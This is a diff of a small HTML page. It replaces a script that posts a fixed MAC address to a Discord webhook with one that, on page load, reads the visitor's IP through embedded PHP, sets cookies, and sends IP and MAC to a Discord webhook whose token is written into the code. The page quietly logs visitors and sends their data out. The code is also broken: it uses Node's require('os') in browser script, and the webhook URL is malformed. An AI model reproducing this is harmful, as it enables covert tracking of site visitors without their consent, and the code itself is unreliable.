@@ -1,32 +1,76 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Website</title>
-    <script>
-      function sendMacAddress() {
-        const macAddress = "00:11:22:33:44:55";
-
-        const request = new XMLHttpRequest();
-
-        request.open("POST", "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-");
-        request.setRequestHeader("Content-Type", "application/json");
-
-        const body = {
-          embeds: [
-            {
-              title: "Mac Address",
-              description: macAddress,
-              color: 16777215
-            }
-          ]
-        };
-
-        request.send(JSON.stringify(body));
-      }
-
-      window.onload = sendMacAddress;
-    </script>
+    <title>Log User IP and MAC Address</title>
   </head>
   <body>
+    <script>
+      // Get the user's IP address
+      const ipAddress =
+        "<?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) echo $_SERVER['HTTP_X_FORWARDED_FOR']; else echo $_SERVER['REMOTE_ADDR']; ?>";
+
+      // Set the IP address cookie
+      document.cookie = `ip_address=${ipAddress}; path=/`;
+
+      // Get the user's MAC address
+      const macAddress = getMacAddress();
+
+      // Set the MAC address cookie
+      document.cookie = `mac_address=${macAddress}; path=/`;
+
+      // Log the IP and MAC addresses
+      console.log(`IP Address: ${ipAddress}`);
+      console.log(`MAC Address: ${macAddress}`);
+
+      // Send the IP and MAC addresses to the Discord webhook
+      sendToDiscordWebhook(ipAddress, macAddress);
+
+      // Function to get the user's MAC address
+      function getMacAddress() {
+        // Note: This function may not work in all environments, as it relies on the user's machine being on the same network as the server
+        // and the server being able to access the ARP cache.
+
+        const os = require("os");
+
+        const interfaces = os.networkInterfaces();
+
+        for (const name of Object.keys(interfaces)) {
+          for (const interface of interfaces[name]) {
+            if (interface.family === "IPv4" && !interface.internal) {
+              return interface.hardwareAddress;
+            }
+          }
+        }
+
+        return "Unknown";
+      }
+
+      // Function to send the IP and MAC addresses to the Discord webhook
+      async function sendToDiscordWebhook(ipAddress, macAddress) {
+        // Replace with your own Discord webhook URL
+        const webhookUrl = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-";
+
+        try {
+          const response = await fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              ip_address: ipAddress,
+              mac_address: macAddress,
+            }),
+          });
+
+          if (!response.ok) {
+            throw new Error("Error sending message to Discord webhook");
+          }
+
+          console.log("Message sent to Discord webhook");
+        } catch (error) {
+          console.error(error);
+        }
+      }
+    </script>
   </body>
 </html>
